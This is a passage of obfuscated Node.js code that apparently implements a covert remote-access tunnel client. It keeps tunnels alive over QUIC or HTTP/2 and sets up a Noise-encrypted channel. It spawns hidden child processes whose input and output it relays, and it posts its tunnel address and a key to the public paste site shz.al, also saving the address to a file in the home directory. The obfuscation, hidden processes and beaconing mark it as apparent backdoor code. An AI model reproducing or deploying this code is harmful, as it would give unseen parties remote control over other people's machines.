        return l[je(0x6d4)] = this['_runLoop'](l, h, i, j)[je(0x22d)](p => this[je(0x57a)][je(0xb34)](je(0x45a) + k + je(0xd76) + p['message'])), f['push'](l), this[je(0x668)][je(0x9fe)](a, f), this[je(0x57a)][je(0xb82)](d[je(0xae5)](d[je(0x9df)](d[je(0xae5)](d[je(0x9df)](d['fBFRf'](d['HNANA'], k) + d[je(0x950)], a), '\x20('), l[je(0x288)]), ')')), l;
    }
    [a0c4(0x300)]() {
        const jf = a0c4, a = [], b = [...this[jf(0x668)][jf(0xa7e)]()][jf(0x97b)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels'][jf(0x5f2)](c)) {
                a[jf(0x21f)]({
                    'tunnel_domain': d['tunnelDomain'],
                    'port': d[jf(0x694)],
                    'created_at': d[jf(0x7c8)],
                    'transport': d[jf(0x288)]
                });
            }
        }
        return a;
    }
    async ['remove'](a, b) {
        const jg = a0c4, c = {
                'KQuxe': function (i, j) {
                    return i === j;
                },
                'VdhsT': function (i, j) {
                    return i === j;
                },
                'YsFFk': function (i, j) {
                    return i === j;
                },
                'nvpdB': function (i, j) {
                    return i > j;
                },
                'IzeVU': jg(0xd12),
                'cVDUI': function (i, j) {
                    return i !== j;
                },
                'yoFdo': jg(0x6bd),
                'kWbNK': jg(0x498)
            }, d = this[jg(0x668)]['get'](a) || [];
        if (c[jg(0x240)](d['length'], 0x0))
            return {
                'status': 0x194,
                'message': jg(0x5a1) + a
            };
        let f;
        if (c[jg(0x6d2)](b, undefined) || c[jg(0x6d2)](b, null) || c[jg(0xa00)](b, '')) {
            if (c[jg(0x65f)](d[jg(0xcfc)], 0x1))
                return {
                    'status': 0x199,
                    'message': jg(0x845) + a + jg(0x746)
                };
            f = d;
        } else {
            f = d['filter'](i => i[jg(0x832)] === b);
            if (f[jg(0xcfc)] === 0x0)
                return {
                    'status': 0x194,
                    'message': jg(0x5a1) + a + jg(0x2f5) + b
                };
        }
        const g = [];
        for (const i of f) {
            const j = c[jg(0x7ae)][jg(0x3ff)]('|');
            let k = 0x0;
            while (!![]) {
                switch (j[k++]) {
                case '0':
                    if (c[jg(0xdb8)](i[jg(0xda9)], null))
                        try {
                            i['sock'][jg(0x4b0)]();
                        } catch (l) {
                        }
                    continue;
                case '1':
                    await i[jg(0x6d4)][jg(0x22d)](() => {
                    });
                    continue;
                case '2':
                    if (c[jg(0xdb8)](i[jg(0xb6e)], null))
                        try {
                            i[jg(0xb6e)][jg(0xd8e)](c['yoFdo']);
                        } catch (m) {
                        }
                    continue;
                case '3':
                    g[jg(0x21f)]({
                        'tunnel_domain': i[jg(0x832)],
                        'port': i['port'],
                        'created_at': i[jg(0x7c8)],
                        'transport': i[jg(0x288)]
                    });
                    continue;
                case '4':
                    i[jg(0x987)] = !![];
                    continue;
                }
                break;
            }
        }
        const h = d[jg(0xaf5)](n => !n[jg(0x987)]);
        h[jg(0xcfc)] > 0x0 ? this['tunnels'][jg(0x9fe)](a, h) : this[jg(0x668)][jg(0xdab)](a);
        for (const n of g) {
            this[jg(0x57a)][jg(0xb82)](c[jg(0xbfd)] + n[jg(0x367)]);
        }
        return {
            'status': 'ok',
            'deleted': g['length'],
            'tunnels': g
        };
    }
    async [a0c4(0x2f3)](a, b, c, d) {
        const jh = a0c4, f = {
                'UlDOL': function (k, l) {
                    return k + l;
                },
                'kcVJx': 'http://127.0.0.1:',
                'ZQJVL': function (k, l) {
                    return k !== l;
                },
                'gGgbH': jh(0x8da),
                'qmWAr': function (k, l) {
                    return k === l;
                },
                'OYytQ': 'quic',
                'QJXRW': function (k, l, m, n) {
                    return k(l, m, n);
                },
                'PbDfm': function (k, l) {
                    return k > l;
                },
                'mKNer': function (k, l) {
                    return k % l;
                },
                'STXMm': function (k, l) {
                    return k + l;
                },
                'olyap': function (k, l) {
                    return k + l;
                },
                'RZLyb': jh(0x801),
                'Hqpah': jh(0x965),
                'iQAJU': function (k, l) {
                    return k !== l;
                },
                'JQSMR': 'tunnel\x20closed',
                'aOlgy': function (k, l) {
                    return k !== l;
                },
                'TEaGJ': function (k, l) {
                    return k !== l;
                },
                'ZnBYN': function (k, l) {
                    return k >= l;
                },
                'oUEdc': function (k, l) {
                    return k(l);
                },
                'GsRBP': function (k, l) {
                    return k * l;
                },
                'whAkX': function (k, l) {
                    return k(l);
                },
                'OmSTj': function (k, l) {
                    return k * l;
                }
            }, g = f['UlDOL'](f[jh(0xd11)], a[jh(0x694)]), h = async k => {
                for (let l = 0x0; l < k && !a['stopped']; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math['min'](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[jh(0x987)]) {
            let k = null, l = null, m = null;
            try {
                const o = f[jh(0x8b1)](String(process.env.KISAMA_EDGE_INSECURE || '')[jh(0xc48)](), f[jh(0x2a5)]);
                if (f[jh(0x940)](a[jh(0x288)], f['OYytQ'])) {
                    m = await f[jh(0x553)](a0bL, this[jh(0x57a)], f[jh(0x5f1)](a0bQ, 0x0) ? a0bQ : 0x7530, o);
                    if (a['stopped']) {
                        try {
                            m[jh(0xd8e)](jh(0x6bd));
                        } catch (p) {
                        }
                        break;
                    }
                    a[jh(0xb6e)] = m, j = f[jh(0x1b9)](j + 0x1, 0x4), await new a0bK(m, g, b, c, d, j, this[jh(0x57a)])[jh(0xbc9)]();
                } else {
                    k = await a0aP(o, this[jh(0x57a)]);
                    if (a[jh(0x987)]) {
                        try {
                            k['destroy']();
                        } catch (q) {
                        }
                        break;
                    }
                    a[jh(0xda9)] = k, j = f[jh(0x1b9)](f[jh(0x544)](j, 0x1), 0x4), l = new a0aH(k, g, b, c, d, j, this[jh(0x57a)], a['tunnelDomain'], ![], { 'printed': !![] }), await l[jh(0xbc9)]();
                }
            } catch (r) {
                !a[jh(0x987)] && this['log'][jh(0xb34)](f[jh(0xb2a)](f[jh(0x1b5)](f[jh(0x650)] + a[jh(0x832)], f[jh(0x693)]), r['message']));
            } finally {
                if (f[jh(0x7c1)](k, null))
                    try {
                        k[jh(0x4b0)]();
                    } catch (s) {
                    }
                if (f[jh(0x8b1)](m, null))
                    try {
                        m[jh(0xd8e)](f['JQSMR']);
                    } catch (t) {
                    }
                a['sock'] = null, a[jh(0xb6e)] = null;
            }
            if (a[jh(0x987)])
                break;
            const n = f[jh(0x7d4)](l, null) && l[jh(0x5cc)] || f[jh(0x55f)](m, null) && m['registered'];
            n ? (i = 0x0, a['quicFailures'] = 0x0) : (i += 0x1, f[jh(0x940)](a[jh(0x288)], f[jh(0x652)]) && (a[jh(0x6fa)] += 0x1, f['ZnBYN'](a[jh(0x6fa)], a0bO) && (a['transport'] = 'h2', this[jh(0x57a)][jh(0xb34)](jh(0x801) + a[jh(0x832)] + jh(0x4b3) + a[jh(0x6fa)] + jh(0xd1b)), a[jh(0x6fa)] = 0x0)), f['ZnBYN'](i, a0bO) && (await this[jh(0x685)](a, (u, v, w) => {
                b = u, c = v, d = w;
            }) ? (i = 0x0, a['quicFailures'] = 0x0) : await f[jh(0xc31)](h, f[jh(0xc25)](a0bP, 0x3e8)))), !a[jh(0x987)] && await f[jh(0x6f7)](h, f['OmSTj'](a0bM, 0x3e8));
        }
    }
    [a0c4(0x685)](a, b) {
        const ji = a0c4, c = {
                'vsSfE': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'VbeQM': ji(0xc82),
                'QUOZz': function (f, g) {
                    return f + g;
                },
                'niqvq': function (f, g) {
                    return f + g;
                },
                'vyYpD': function (f, g) {
                    return f + g;
                },
                'xUwlm': ji(0x350),
                'nNPps': ji(0x672),
                'DJecs': ji(0xacb),
                'qSqqZ': function (f, g) {
                    return f(g);
                },
                'KMTsR': ji(0x2d0)
            }, d = this[ji(0xbe0)] || a0aE;
        return c['qSqqZ'](d, c[ji(0x39e)])[ji(0xcb3)](([f, g, h, i]) => {
            const jj = ji, j = a[jj(0x832)];
            c[jj(0x1a3)](b, g, h, i), a['tunnelDomain'] = f[jj(0x6ec)](c['VbeQM']) ? f : c[jj(0x879)](c[jj(0xbb6)], f), this[jj(0x57a)][jj(0xb34)](c[jj(0x879)](c[jj(0x948)](c[jj(0x336)](c[jj(0xa0a)], j), c[jj(0x713)]), a[jj(0x832)]));
            if (typeof this[jj(0x301)] === c['DJecs'])
                try {
                    this[jj(0x301)](j, a[jj(0x832)]);
                } catch (k) {
                }
            return !![];
        })[ji(0x22d)](f => {
            const jk = ji;
            return this[jk(0x57a)][jk(0xb34)](jk(0x86f) + f[jk(0x1f1)]), ![];
        });
    }
}
class a0bT {
    static [a0c4(0x5de)] = ![];
    static [a0c4(0x394)] = null;
    static [a0c4(0xa7c)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0c4(0x9e1)] = ![];
    static [a0c4(0xb73)]() {
        const jl = a0c4, a = {
                'LoIHB': jl(0x869),
                'dNfpY': function (g, h) {
                    return g < h;
                },
                'zDheZ': jl(0x644),
                'cFHtH': function (g, h) {
                    return g === h;
                },
                'mjyDk': function (g, h) {
                    return g || h;
                },
                'QNqNx': jl(0x543),
                'sjIiH': jl(0x69e),
                'Rdaoi': jl(0x285)
            }, b = a0P[jl(0x644)] || '', c = a0P[jl(0x1a8)] || a0P['KNAME'] || '', d = [];
        if (b['length'] < 0x3)
            d['push'](jl(0x426) + b[jl(0xcfc)] + jl(0x8b8));
        if (!this['_SHZAL_NAME_CHARS'][jl(0x1d0)](b))
            d['push'](a[jl(0x893)]);
        if (a[jl(0x891)](c['length'], 0x8))
            d[jl(0x21f)]('密钥过短\x20(' + c['length'] + jl(0x684) + (a0P[jl(0x1a8)] ? jl(0x1a8) : a[jl(0x2d5)]) + ')');
        const f = a[jl(0x65a)](d[jl(0xcfc)], 0x0);
        return !f && !this[jl(0x9e1)] && (this['_SHZAL_KEY_HINT_SHOWN'] = !![], a0D[jl(0xb82)]('[KMODE]\x20⚠️\x20KMODE=2\x20未生效,\x20条件不满足:\x20' + d[jl(0x6e5)](';\x20') + '\x20' + ('(KNAME=' + a[jl(0x3d6)](b, a[jl(0x3d1)]) + ',\x20KNAME_KEY=' + (a0P['KNAME_KEY'] ? jl(0x86c) + a0P[jl(0x1a8)][jl(0xcfc)] + ')' : a['sjIiH']) + ')')), a0D[jl(0xb82)](a[jl(0x7e0)])), f;
    }
    static [a0c4(0x700)]() {
        const jm = a0c4, a = {
                'pWkDt': function (b, c) {
                    return b(c);
                },
                'RaJZF': jm(0x8da)
            };
        return a0P[jm(0x708)] || a[jm(0x5ed)](String, process.env.SHZAL_DEBUG || '')[jm(0xc48)]() === a[jm(0x509)];
    }
    static [a0c4(0xb70)](a) {
        const jn = a0c4, b = {
                'nUrhy': function (f, g) {
                    return f + g;
                },
                'FFCef': '[KMODE:shz.al]\x20',
                'NWcNA': jn(0xbb0),
                'JkOCL': function (f, g) {
                    return f(g);
                },
                'sOakI': function (f, g) {
                    return f + g;
                },
                'eHuCB': jn(0xb21),
                'QEbkt': function (f, g) {
                    return f(g);
                },
                'HwluA': 'PUT\x20覆盖状态:\x20',
                'RjAeV': '\x20(成功)',
                'mhSxO': jn(0x4fc),
                'SqPox': function (f, g) {
                    return f(g);
                },
                'JRMVU': 'POST\x20https://shz.al/\x20状态:\x20',
                'higMR': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'IwTPj': jn(0xac0),
                'GDYpJ': '----kisama',
                'XGOut': jn(0xd47),
                'ihwGD': function (f, g) {
                    return f + g;
                },
                'DaKax': function (f, g) {
                    return f + g;
                },
                'JzGuu': function (f, g) {
                    return f + g;
                },
                'LgIbC': '开始上报域名\x20->\x20',
                'cnkCf': jn(0x1e8),
                'ACnNF': function (f, g) {
                    return f > g;
                },
                'Imvux': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'SZOcv': jn(0x440),
                'SXtVq': function (f, g) {
                    return f + g;
                },
                'geEzk': '上报异常:\x20',
                'rZsMF': function (f, g) {
                    return f(g);
                }
            }, c = this[jn(0x700)](), d = f => {
                const jo = jn;
                if (c)
                    a0D[jo(0x354)](b['nUrhy'](b[jo(0x681)], f));
            };
        return new Promise(f => {
            const jr = jn, g = {
                    'Glunc': function (n, o) {
                        const jp = a0b;
                        return b[jp(0x3a4)](n, o);
                    },
                    'xNYAM': function (n, o) {
                        return n + o;
                    },
                    'ZLlIT': function (n, o) {
                        const jq = a0b;
                        return b[jq(0xc70)](n, o);
                    },
                    'VfSWY': b[jr(0x3ad)],
                    'oPBKN': function (n, o) {
                        return n(o);
                    },
                    'ydZgD': function (n, o) {
                        return b['QEbkt'](n, o);
                    },
                    'VDPwJ': b[jr(0x3f7)],
                    'DLEye': function (n, o) {
                        return n === o;
                    },
                    'HtPqL': b[jr(0x35e)],
                    'HKNSg': b[jr(0x868)],
                    'PlXFr': function (n, o) {
                        const js = jr;
                        return b[js(0xd88)](n, o);
                    },
                    'AwKbv': function (n, o) {
                        return n + o;
                    },
                    'dwAbt': b[jr(0x8f2)],
                    'TltCK': '名字被占用,\x20改用\x20PUT\x20覆盖:\x20https://shz.al/~',
                    'SGFHb': function (n, o, p, q, r) {
                        return b['higMR'](n, o, p, q, r);
                    },
                    'fnftw': 'PUT',
                    'ZlEIH': b['IwTPj']
                }, h = a0P['KNAME'], i = a0P['KNAME_KEY'] || a0P[jr(0x644)], j = b[jr(0x3be)] + a0k[jr(0xa8d)](0xc)[jr(0xa3c)](b['XGOut']), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const jt = jr, o = n[jt(0x922)](([p, q]) => Buffer[jt(0x581)]('--' + j + jt(0xcdc) + p + jt(0xc36) + q + '\x0d\x0a'));
                    return o[jt(0x21f)](Buffer[jt(0x581)]('--' + j + '--\x0d\x0a')), Buffer[jt(0x6ef)](o);
                }, m = (n, o, p, q) => {
                    const ju = jr, r = { 'BkeUB': ju(0xb3a) }, s = new URL(n), t = a0h[ju(0x98b)]({
                            'hostname': s['hostname'],
                            'port': s[ju(0x694)] || 0x1bb,
                            'path': b[ju(0x740)](s['pathname'], s['search']),
                            'method': p,
                            'headers': {
                                'Content-Type': ju(0xd2b) + j,
                                'Content-Length': o ? o[ju(0xcfc)] : 0x0,
                                'User-Agent': ju(0xc12)
                            }
                        }, v => {
                            const jv = ju;
                            v[jv(0x1f7)](), v['on'](r[jv(0x4c8)], () => q(v[jv(0x5b8)]));
                        });
                    t['on'](b[ju(0x588)], v => {
                        const jw = ju;
                        g[jw(0xc65)](d, g['xNYAM'](g[jw(0x5d5)](g[jw(0x802)](p, '\x20'), n), g['VfSWY']) + v[jw(0x1f1)]), g[jw(0x583)](q, 0x0);
                    }), t[ju(0xd5c)](0x7530, () => t['destroy'](new Error('shz.al\x20request\x20timeout')));
                    if (o)
                        t[ju(0x32b)](o);
                    t['end']();
                };
            d(b[jr(0x8ce)](b[jr(0x211)](b['JzGuu'](b[jr(0x740)](b[jr(0x380)], h), b[jr(0x2fa)]), b[jr(0x612)](i[jr(0xcfc)], 0x0)), ')'));
            try {
                b[jr(0xd77)](m, 'https://shz.al/', b[jr(0xd88)](l, k), b['SZOcv'], n => {
                    const jx = jr;
                    g[jx(0xca4)](d, g['AwKbv'](g[jx(0x8fe)], n));
                    if (n === 0x199) {
                        g['ydZgD'](d, g['AwKbv'](g[jx(0x802)](g[jx(0x1ff)], h), ':*'));
                        const o = k[jx(0xaf5)](([p]) => p !== 'n');
                        g[jx(0xbb4)](m, jx(0x6ae) + h + ':' + i, g[jx(0xca4)](l, o), g[jx(0x896)], p => {
                            const jy = jx;
                            g[jy(0xc2e)](d, g[jy(0x802)](g['VDPwJ'], p) + (g[jy(0x84a)](p, 0xc8) ? g['HtPqL'] : g[jy(0x901)])), g[jy(0x583)](f, g[jy(0x84a)](p, 0xc8));
                        });
                    } else
                        n === 0xc8 ? (d(jx(0x6f6)), f(!![])) : (g['Glunc'](d, g[jx(0x802)](g[jx(0x8fc)] + n, ')')), f(![]));
                });
            } catch (n) {
                b[jr(0x40e)](d, b['SXtVq'](b['geEzk'], n['message'])), b[jr(0x6a3)](f, ![]);
            }
        })[jn(0xcb3)](f => {
            const jz = jn;
            if (f)
                this[jz(0x394)] = a;
            return f;
        })[jn(0x22d)](() => ![]);
    }
    static async [a0c4(0x9a0)](a) {
        const jA = a0c4, b = {
                'StcpS': function (c, d) {
                    return c < d;
                }
            };
        for (let c = 0x1; c <= 0x3; c++) {
            if (await this['reportShzal'](a))
                return;
            b[jA(0xb01)](c, 0x3) && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0c4(0x98f)]() {
        const jB = a0c4, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[jB(0xc2f)](b) && a0l['statSync'](b)[jB(0x39a)]())
                return b;
        }
        try {
            return a0p[jB(0x983)]();
        } catch (c) {
            return process[jB(0x2cb)]();
        }
    }
    static ['resolveDomainFilePath']() {
        const jC = a0c4, a = {
                'DQUoZ': jC(0x8f1),
                'bDkrz': '$HOME',
                'RfAcL': function (c, d) {
                    return c > d;
                }
            };
        let b = (a0P[jC(0xa83)] || '')[jC(0x7e4)]();
        if (!b)
            return a0o[jC(0x6e5)](this[jC(0x98f)](), a[jC(0xa5a)]);
        if (b[jC(0x6ec)](a[jC(0xd6e)]))
            b = a['RfAcL'](b[jC(0xcfc)], 0x5) ? a0o[jC(0x6e5)](this['homeDir'](), b['slice'](0x5)[jC(0x1ad)](/^[/\\]+/, '')) : this[jC(0x98f)]();
        else
            b['startsWith']('~') && (b = a0o[jC(0xa50)](b[jC(0x1ad)](/^~(?=[/\\]|$)/, this[jC(0x98f)]())));
        return b;
    }
    static [a0c4(0x934)](a) {
        const jD = a0c4;
        this[jD(0x394)] = a;
        const b = this['resolveDomainFilePath']();
        try {
            a0l[jD(0xb8d)](a0o[jD(0x3b8)](a0o['resolve'](b)), { 'recursive': !![] }), a0l[jD(0x7fe)](b, a), a0D[jD(0xb82)]('[KMODE]\x20📄\x20隧道域名已写入:\x20' + b);
        } catch (c) {
            a0D[jD(0x782)](jD(0x563) + b + jD(0x438) + c[jD(0x1f1)]);
        }
    }
    static ['deleteDomainFile']() {
        const jE = a0c4, a = this['resolveDomainFilePath']();
        try {
            a0l[jE(0xc2f)](a) && a0l[jE(0x4c6)](a)[jE(0x43a)]() && (a0l[jE(0x53d)](a), a0D['info']('[KMODE]\x20🗑️\x20域名文件已删除:\x20' + a));
        } catch (b) {
            a0D['warn'](jE(0x6a0) + a + jE(0x438) + b['message']);
        }
    }
    static ['onBaseinfoSuccess']() {
        const jF = a0c4;
        !this[jF(0x5de)] && (this['_baseinfoHooked'] = !![], this['deleteDomainFile']());
    }
    static [a0c4(0xa20)]() {
        const jG = a0c4, a = {
                'lIYjS': function (b, c) {
                    return b === c;
                },
                'jEeRw': '/domain',
                'DubsP': jG(0xa0f),
                'KYAjR': jG(0x916),
                'znKnT': jG(0xbb0)
            };
        try {
            const b = a0q[jG(0x93a)]({
                'input': process[jG(0xd39)],
                'terminal': ![]
            });
            b['on'](a['KYAjR'], c => {
                const jH = jG;
                a[jH(0xd49)](c[jH(0x7e4)](), a[jH(0xae4)]) && console[jH(0x57a)](this[jH(0x394)] || a['DubsP']);
            }), b['on'](jG(0xd8e), () => {
            }), b['on'](a[jG(0x3bc)], () => {
            });
        } catch (c) {
        }
    }
    static [a0c4(0x6f8)](a) {
        const jI = a0c4, b = {
                'rqCuw': function (c, d) {
                    return c === d;
                },
                'RCXMG': function (c, d) {
                    return c + d;
                },
                'aehOW': function (c, d) {
                    return c + d;
                },
                'qoKXq': jI(0x62a),
                'zAeCI': jI(0x646),
                'PSwos': jI(0x28f),
                'DHqKg': '[KMODE]\x20🚀\x20KMODE=1:\x20启动时自动创建临时隧道'
            };
        if (a0P[jI(0xbb7)] === '2' && this['knameValid']()) {
            const c = b['rqCuw'](a0P[jI(0xd79)], !![]);
            a0D[jI(0xb82)](b[jI(0x7da)](b['aehOW'](b[jI(0x7da)](b['qoKXq'], c ? 'q' : ''), b[jI(0x58c)]), c ? b['PSwos'] : '')), a[jI(0x301)] = (d, f) => {
                const jJ = jI;
                this[jJ(0x9a0)](f);
            }, a['create'](a0P[jI(0x2ab)], ![], c)['then'](d => this[jI(0xb70)](d[jI(0x832)]))[jI(0x22d)](() => {
            });
            return;
        }
        a0D[jI(0xb82)](b['DHqKg']), a[jI(0x301)] = (d, f) => {
            this['writeDomainFile'](f);
        }, a['create'](a0P[jI(0x2ab)])['then'](d => {
            const jK = jI;
            this[jK(0x934)](d['tunnelDomain']);
        })[jI(0x22d)](d => {
            const jL = jI;
            a0D[jL(0x782)](jL(0x1de) + d[jL(0x1f1)]);
        }), this[jI(0xa20)]();
    }
}
let a0bU = null, a0bV = null;
const a0bW = new Promise((a, b) => {
    const jM = a0c4, c = {
            'eEYHC': jM(0x2ed),
            'xjYoh': jM(0x291),
            'BWYok': function (d) {
                return d();
            },
            'mgvvu': jM(0x99c),
            'dtHjv': function (d) {
                return d();
            },
            'isfbK': '[WARN]\x20Exception\x20loading\x20Noise\x20module:'
        };
    try {
        a0y(function (d) {
            const jN = jM;
            if (!d) {
                a0bV = new Error(c[jN(0xb27)]), a0D[jN(0x782)](c[jN(0x3f5)], a0bV[jN(0x1f1)]), c['BWYok'](a);
                return;
            }
            a0bU = d, a0D[jN(0x354)](c[jN(0x638)]), c[jN(0xd0e)](a);
        });
    } catch (d) {
        a0bV = d, a0D['warn'](c['isfbK'], d[jM(0x1f1)]), c[jM(0xd0e)](a);
    }
});
process['on'](a0c4(0x2c5), (a, b) => {
    a0D['error']('Unhandled\x20Promise\x20Rejection:', a);
}), process['on'](a0c4(0x33f), a => {
    const jO = a0c4, b = { 'ljpAS': jO(0xdb2) };
    a0D['error'](b[jO(0x459)], a), process[jO(0x34e)](0x1);
});
class a0bX {
    constructor(a, b, c) {
        const jP = a0c4;
        this[jP(0x5fb)] = a, this['localPrivB64'] = b, this[jP(0x63d)] = c, this[jP(0xcff)] = ![], this['hs'] = null, this['sendCipher'] = null, this[jP(0x915)] = null;
    }
    async [a0c4(0xd98)]() {
        const jQ = a0c4, a = {
                'Qcpxy': 'Noise\x20WASM\x20module\x20not\x20available',
                'lKPAf': jQ(0x73b),
                'JbHJr': jQ(0x624),
                'ZLCFF': jQ(0x7be)
            };
        await a0bW;
        if (!a0bU)
            throw a0bV || new Error(a[jQ(0x1cf)]);
        const b = a0bU, c = this[jQ(0x5fb)] ? b[jQ(0xbd2)][jQ(0x788)] : b['constants'][jQ(0x407)];
        this['hs'] = b[jQ(0x6f3)](a[jQ(0xc7e)], c);
        const d = Buffer['from'](a[jQ(0x787)]), f = this[jQ(0x4c9)] ? Buffer[jQ(0x581)](this[jQ(0x4c9)], a[jQ(0x1cc)]) : null, g = this[jQ(0x63d)] ? Buffer[jQ(0x581)](this[jQ(0x63d)], a['ZLCFF']) : null;
        this['hs'][jQ(0x337)](d, f, g, null);
    }
    [a0c4(0x2c8)](a) {
        const jR = a0c4, b = {
                'VMdhP': function (d, f) {
                    return d > f;
                },
                'oFhde': function (d, f) {
                    return d === f;
                },
                'WhcnH': function (d, f) {
                    return d === f;
                }
            };
        if (this['handshakeFinished'])
            return Buffer['alloc'](0x0);
        const c = a0bU;
        a && b[jR(0x8e2)](a[jR(0xcfc)], 0x0) && b[jR(0x4cb)](this['hs']['GetAction'](), c[jR(0xbd2)][jR(0x9a2)]) && this['hs'][jR(0x395)](a);
        if (b[jR(0x1b6)](this['hs'][jR(0xa16)](), c['constants'][jR(0x730)]))
            return this[jR(0x51b)](), Buffer[jR(0x9b5)](0x0);
        if (b[jR(0x1b6)](this['hs']['GetAction'](), c[jR(0xbd2)][jR(0x793)])) {
            const d = this['hs'][jR(0xd3e)](new Uint8Array(0x0));
            return b[jR(0x1b6)](this['hs']['GetAction'](), c[jR(0xbd2)][jR(0x730)]) && this[jR(0x51b)](), Buffer['from'](d);
        }
        return Buffer[jR(0x9b5)](0x0);
    }
    [a0c4(0x51b)]() {
        const jS = a0c4, a = {
                'YHXKO': function (g, h) {
                    return g === h;
                }
            };
        let b = null;
        try {
            b = this['hs']['GetRemotePublicKey']();
        } catch (g) {
            b = null;
        }
        const c = this['expectedRemotePubB64'] ? Buffer[jS(0x581)](this[jS(0x63d)], 'base64') : null, d = b && c && a[jS(0x927)](b[jS(0xcfc)], c[jS(0xcfc)]) && a0k[jS(0x5b2)](Buffer[jS(0x581)](b), c);
        if (!d)
            throw new Error('Noise\x20peer\x20static\x20key\x20verification\x20failed');
        const f = this['hs'][jS(0xd96)]();
        this[jS(0x4ec)] = f[0x0], this[jS(0x915)] = f[0x1], this[jS(0xcff)] = !![];
        try {
            if (this['hs'])
                this['hs'][jS(0x6ad)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0c4(0xb44)](a) {
        const jT = a0c4, b = { 'khrmL': '握手未完成，无法加密数据' };
        if (!this[jT(0xcff)])
            throw new Error(b[jT(0x56c)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this['sendCipher'][jT(0xd7b)](c, d));
    }
    ['decrypt'](a) {
        const jU = a0c4, b = { 'cDStH': jU(0xb61) };
        if (!this['handshakeFinished'])
            throw new Error(b[jU(0x993)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[jU(0x581)](this[jU(0x915)][jU(0xd02)](c, d));
    }
    [a0c4(0x6ad)]() {
        const jV = a0c4;
        try {
            if (this[jV(0x4ec)])
                this['sendCipher']['free']();
        } catch (a) {
        }
        try {
            if (this[jV(0x915)])
                this[jV(0x915)][jV(0x6ad)]();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][jV(0x6ad)]();
        } catch (c) {
        }
        this[jV(0x4ec)] = null, this[jV(0x915)] = null, this['hs'] = null;
    }
}
class a0bY {
    constructor(a, b, c, d) {
        const jW = a0c4, f = { 'SkITS': jW(0xb89) }, g = f[jW(0xbac)][jW(0x3ff)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[jW(0xa51)] = null;
                continue;
            case '1':
                this[jW(0x7bd)] = d || [];
                continue;
            case '2':
                this[jW(0x6cd)] = b;
                continue;
            case '3':
                this[jW(0x209)] = a;
                continue;
            case '4':
                this[jW(0xb58)] = null;
                continue;
            case '5':
                this[jW(0x5ba)] = null;
                continue;
            case '6':
                this['pid'] = 0x0;
                continue;
            case '7':
                this['cwd'] = c;
                continue;
            }
            break;
        }
    }
    [a0c4(0x569)]() {
        const jX = a0c4, a = {
                'ArHCj': function (c, d) {
                    return c || d;
                },
                'hQgrv': jX(0x5e4),
                'AWHat': 'data',
                'fqcZd': jX(0x34e)
            };
        this[jX(0xb58)] = a0s(this[jX(0x209)], this[jX(0x7bd)], {
            'env': this[jX(0x6cd)],
            'cwd': this['cwd'],
            'windowsHide': !![],
            'stdio': [
                a[jX(0x1e7)],
                jX(0x5e4),
                a[jX(0x1e7)]
            ]
        }), this[jX(0xa57)] = this[jX(0xb58)][jX(0xa57)] || 0x0;
        const b = this;
        this[jX(0xb58)][jX(0x7e5)]['on'](a[jX(0x909)], c => b[jX(0x20c)](c)), this[jX(0xb58)][jX(0x8e1)]['on'](jX(0x369), c => b[jX(0x20c)](c)), this[jX(0xb58)]['on'](a[jX(0x2ba)], (c, d) => {
            const jY = jX;
            if (b['_onExitCb'])
                b[jY(0x5ba)]({
                    'exitCode': c,
                    'signal': a[jY(0x6ca)](d, null)
                });
        });
    }
    [a0c4(0x20c)](a) {
        const jZ = a0c4, b = { 'JJbGE': 'utf-8' };
        if (this[jZ(0xa51)])
            this[jZ(0xa51)](a[jZ(0xa3c)](b['JJbGE']));
    }
    [a0c4(0xcad)](a) {
        const k0 = a0c4;
        return this[k0(0xa51)] = a, {
            'dispose': () => {
                const k1 = k0;
                this[k1(0xa51)] = null;
            }
        };
    }
    ['onExit'](a) {
        const k2 = a0c4;
        return this[k2(0x5ba)] = a, {
            'dispose': () => {
                this['_onExitCb'] = null;
            }
        };
    }
    [a0c4(0x32b)](a) {
        const k3 = a0c4;
        if (!this[k3(0xb58)] || !this[k3(0xb58)][k3(0xd39)])
            return;
        try {
            this[k3(0xb58)]['stdin'][k3(0x32b)](a);
        } catch (b) {
        }
    }
    [a0c4(0x55d)]() {
    }
    [a0c4(0x2e6)]() {
        const k4 = a0c4;
        try {
            if (this[k4(0xb58)])
                this[k4(0xb58)]['kill']();
        } catch (a) {
        }
    }
}
class a0bZ {
    constructor() {
        const k5 = a0c4, a = { 'VNGFj': k5(0x5ae) }, b = k5(0x23a)['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[k5(0x9f2)] = a[k5(0x4d3)];
                continue;
            case '1':
                this['ptyProcess'] = null;
                continue;
            case '2':
                this[k5(0xaee)] = ![];
                continue;
            case '3':
                this[k5(0x59e)] = ![];
                continue;
            case '4':
                this['cipher'] = new a0bX(![], this[k5(0x269)], this[k5(0xb65)]);
                continue;
            case '5':
                this['useNoise'] = !![];
                continue;
            case '6':
                this['msgQueue'] = [];
                continue;
            case '7':
                this[k5(0x7f4)] = null;
                continue;
            case '8':
                this[k5(0xb99)] = null;
                continue;
            case '9':
                this[k5(0xbfe)] = [];
                continue;
            case '10':
                this[k5(0x269)] = a0P[k5(0xc15)][k5(0x38d)][k5(0x3ea)];
                continue;
            case '11':
                this[k5(0xb65)] = a0P[k5(0xc15)][k5(0xbe5)][k5(0xc43)];
                continue;
            }
            break;
        }
    }
    async [a0c4(0x539)]() {
        const k6 = a0c4, a = {
